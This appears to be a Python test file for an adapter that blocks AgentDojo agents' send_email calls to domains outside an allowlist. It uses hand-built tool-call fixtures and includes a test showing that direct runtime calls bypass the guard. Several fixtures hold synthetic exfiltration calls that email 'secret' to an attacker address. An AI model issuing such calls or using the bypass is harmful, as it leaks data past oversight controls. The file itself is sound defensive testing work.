"""Deterministic tests for src/trustline_bench/agentdojo_adapter.py,
using the REAL installed AgentDojo interfaces (FunctionCall,
FunctionsRuntime, the real workspace suite's real send_email tool and
real environment) -- but a synthetic, hand-built assistant message
standing in for what a real model would produce, exactly the way the
custom suite's fixtures stand in for model turns elsewhere in this
benchmark. No model is called; no network request is made anywhere in
this file.

These tests exist to prove the claims in
docs/agentdojo_trustline_integration.md with executable evidence, not
just prose: a denied call never reaches AgentDojo's real environment: an
allowed call does, unchanged; an unmapped tool passes through; and
calling the underlying runtime directly bypasses the adapter entirely
(the documented, un-closed limitation).

Requires the `agentdojo` optional dependency group
(`pip install -e ".[agentdojo]"`); skipped cleanly if it isn't installed,
consistent with the dependency separation this phase introduced.
"""

from __future__ import annotations

import pytest

agentdojo = pytest.importorskip("agentdojo", reason="requires the 'agentdojo' optional dependency group")

from agentdojo.functions_runtime import FunctionCall, FunctionsRuntime  # noqa: E402
from agentdojo.task_suite.load_suites import get_suites  # noqa: E402

from trustline_bench import gateway  # noqa: E402
from trustline_bench.agentdojo_adapter import TrustLineEnforcementElement, translate_agentdojo_call  # noqa: E402

# TrustLine's real, configured ALLOWED_EMAIL_DOMAINS is {"trustline-corp.test"}
# -- but AgentDojo's real send_email tool validates recipients through a real
# pydantic Email model backed by the `email_validator` library, which rejects
# RFC 6761 special-use/reserved TLDs (including ".test") outright, regardless
# of TrustLine's policy. Confirmed empirically: a direct
# rt.run_function(env, "send_email", {"recipients": ["x@trustline-corp.test"], ...})
# raises a ValidationError from AgentDojo's own tool, before TrustLine's
# policy is even relevant. This means no send_email call to TrustLine's
# actual configured allowlisted domain could ever succeed through AgentDojo's
# real tool -- a genuine incompatibility between the two systems' domain
# choices, not a bug in this adapter. Documented in
# docs/agentdojo_trustline_integration.md. Tests that need to demonstrate a
# TrustLine-allowed call executing for real therefore monkeypatch
# gateway.ALLOWED_EMAIL_DOMAINS to a validator-safe domain string for the
# duration of that one test -- this does not touch TrustLine's real
# production policy file.
_VALIDATOR_SAFE_ALLOWED_DOMAIN = "trustline-corp.com"


@pytest.fixture
def workspace_suite():
    return get_suites("v1.2.2")["workspace"]


@pytest.fixture
def real_env(workspace_suite):
    return workspace_suite.load_and_inject_default_environment({})


@pytest.fixture
def real_runtime(workspace_suite):
    send_email_fn = next(fn for fn in workspace_suite.tools if fn.name == "send_email")
    return FunctionsRuntime([send_email_fn])


def _assistant_message(tool_calls):
    return {"role": "assistant", "content": None, "tool_calls": tool_calls}


# ---------------------------------------------------------------------------
# translate_agentdojo_call: pure translation logic
# ---------------------------------------------------------------------------


def test_unmapped_tool_is_reported_as_unmapped_not_allowed_or_denied():
    translation = translate_agentdojo_call("delete_file", {"file_id": "123"})
    assert translation.mapped is False
    assert translation.decision is None
    assert "delete_file" in translation.unmapped_reason


def test_send_email_to_allowed_domain_is_allowed():
    translation = translate_agentdojo_call(
        "send_email", {"recipients": ["someone@trustline-corp.test"], "subject": "hi", "body": "hi"}
    )
    assert translation.mapped is True
    assert translation.decision.verdict.value == "ALLOW"


def test_send_email_to_disallowed_domain_is_denied():
    translation = translate_agentdojo_call(
        "send_email", {"recipients": ["bob@example.com"], "subject": "hi", "body": "hi"}
    )
    assert translation.mapped is True
    assert translation.decision.verdict.value == "DENY"
    assert translation.decision.reason_code == "destination_not_allowlisted"


def test_multi_recipient_denied_if_any_recipient_fails_not_just_the_first():
    translation = translate_agentdojo_call(
        "send_email",
        {
            "recipients": ["ok@trustline-corp.test", "bob@example.com"],
            "subject": "hi",
            "body": "hi",
        },
    )
    assert translation.mapped is True
    assert translation.decision.verdict.value == "DENY"  # the SECOND recipient fails, not the first


def test_multi_recipient_allowed_only_if_every_recipient_passes():
    translation = translate_agentdojo_call(
        "send_email",
        {
            "recipients": ["a@trustline-corp.test", "b@trustline-corp.test"],
            "subject": "hi",
            "body": "hi",
        },
    )
    assert translation.mapped is True
    assert translation.decision.verdict.value == "ALLOW"


# ---------------------------------------------------------------------------
# TrustLineEnforcementElement: the real pipeline-element path, against the
# real workspace environment and real send_email tool.
# ---------------------------------------------------------------------------


def test_denied_call_produces_no_side_effect_in_the_real_environment(real_env, real_runtime):
    before_count = len(real_env.inbox.sent)

    # example.com passes AgentDojo's own real email validation (confirmed
    # empirically) and is simply not in TrustLine's allowlist -- so this
    # denial is attributable to TrustLine's policy specifically, not to
    # AgentDojo rejecting the address on its own for an unrelated reason.
    tool_call = FunctionCall(
        function="send_email",
        args={"recipients": ["attacker@example.com"], "subject": "exfil", "body": "secret"},
        id="call_1",
    )
    messages = [_assistant_message([tool_call])]

    element = TrustLineEnforcementElement()
    _, _, _, result_messages, _ = element.query("q", real_runtime, real_env, messages, {})

    assert len(real_env.inbox.sent) == before_count  # the real environment was never touched

    tool_results = [m for m in result_messages if m["role"] == "tool"]
    assert len(tool_results) == 1
    assert tool_results[0]["tool_call_id"] == "call_1"
    assert "Denied by TrustLine policy" in tool_results[0]["error"]
    assert "destination_not_allowlisted" in tool_results[0]["error"]


def test_allowed_call_executes_normally_against_the_real_environment(real_env, real_runtime, monkeypatch):
    # See _VALIDATOR_SAFE_ALLOWED_DOMAIN above: TrustLine's real configured
    # allowlist domain (trustline-corp.test) is itself rejected by
    # AgentDojo's real email validator, so this test substitutes a
    # validator-safe domain into TrustLine's allowlist for its own duration
    # only, to exercise "TrustLine allows it AND it really executes" --
    # the thing neither domain choice alone could demonstrate.
    monkeypatch.setattr(gateway, "ALLOWED_EMAIL_DOMAINS", frozenset({_VALIDATOR_SAFE_ALLOWED_DOMAIN}))

    before_count = len(real_env.inbox.sent)

    tool_call = FunctionCall(
        function="send_email",
        args={"recipients": [f"colleague@{_VALIDATOR_SAFE_ALLOWED_DOMAIN}"], "subject": "hi", "body": "hi"},
        id="call_2",
    )
    messages = [_assistant_message([tool_call])]

    element = TrustLineEnforcementElement()
    _, _, _, result_messages, _ = element.query("q", real_runtime, real_env, messages, {})

    assert len(real_env.inbox.sent) == before_count + 1  # the real send_email genuinely ran

    tool_results = [m for m in result_messages if m["role"] == "tool"]
    assert len(tool_results) == 1
    assert tool_results[0]["tool_call_id"] == "call_2"
    assert tool_results[0]["error"] is None  # ToolsExecutor's own normal success path, not a TrustLine denial


def test_unmapped_tool_passes_through_and_still_executes(workspace_suite):
    """delete_file has no TrustLine mapping -- this adapter's documented
    scope limit. Proves the pass-through is real: delete_file still
    executes exactly as it would with no adapter present."""
    delete_file_fn = next(fn for fn in workspace_suite.tools if fn.name == "delete_file")
    env = workspace_suite.load_and_inject_default_environment({})
    runtime = FunctionsRuntime([delete_file_fn])

    files_before = dict(env.cloud_drive.files)
    any_file_id = next(iter(files_before))

    tool_call = FunctionCall(function="delete_file", args={"file_id": any_file_id}, id="call_3")
    messages = [_assistant_message([tool_call])]

    element = TrustLineEnforcementElement()
    _, _, _, result_messages, _ = element.query("q", runtime, env, messages, {})

    assert any_file_id not in env.cloud_drive.files  # really executed -- TrustLine had no opinion on it
    tool_results = [m for m in result_messages if m["role"] == "tool"]
    assert len(tool_results) == 1
    assert tool_results[0]["error"] is None


def test_mixed_allowed_and_denied_calls_in_one_turn(real_env, real_runtime, monkeypatch):
    """Both an allowed and a denied send_email in the SAME assistant
    turn: only the allowed one produces a side effect, and both get a
    correctly-correlated tool-result message back."""
    monkeypatch.setattr(gateway, "ALLOWED_EMAIL_DOMAINS", frozenset({_VALIDATOR_SAFE_ALLOWED_DOMAIN}))

    before_count = len(real_env.inbox.sent)

    allowed_call = FunctionCall(
        function="send_email",
        args={"recipients": [f"colleague@{_VALIDATOR_SAFE_ALLOWED_DOMAIN}"], "subject": "a", "body": "a"},
        id="allowed_id",
    )
    denied_call = FunctionCall(
        function="send_email",
        args={"recipients": ["attacker@example.com"], "subject": "b", "body": "b"},
        id="denied_id",
    )
    messages = [_assistant_message([allowed_call, denied_call])]

    element = TrustLineEnforcementElement()
    _, _, _, result_messages, _ = element.query("q", real_runtime, real_env, messages, {})

    assert len(real_env.inbox.sent) == before_count + 1  # only the allowed one ran

    tool_results = {m["tool_call_id"]: m for m in result_messages if m["role"] == "tool"}
    assert tool_results["allowed_id"]["error"] is None
    assert "Denied by TrustLine policy" in tool_results["denied_id"]["error"]


def test_direct_runtime_call_bypasses_the_adapter_entirely_documented_limitation(real_env, real_runtime):
    """Documents, with executable proof, the limitation stated in
    docs/agentdojo_trustline_integration.md: this adapter is a pipeline
    element, not a wrapper around FunctionsRuntime.run_function()
    itself. Anything that calls run_function() directly -- bypassing the
    pipeline ordering -- has no TrustLine check in its way at all."""
    before_count = len(real_env.inbox.sent)

    result, error = real_runtime.run_function(
        real_env, "send_email", {"recipients": ["attacker@example.com"], "subject": "x", "body": "x"}
    )

    assert error is None  # no error -- nothing stopped it
    assert len(real_env.inbox.sent) == before_count + 1  # the real environment WAS touched
    # This is not a bug in the adapter; it is the documented boundary of
    # what a pipeline-element-only integration can cover.


def test_no_tool_calls_message_passes_through_unchanged(real_env, real_runtime):
    messages = [{"role": "assistant", "content": [], "tool_calls": None}]
    element = TrustLineEnforcementElement()
    result = element.query("q", real_runtime, real_env, messages, {})
    assert result[3] == messages
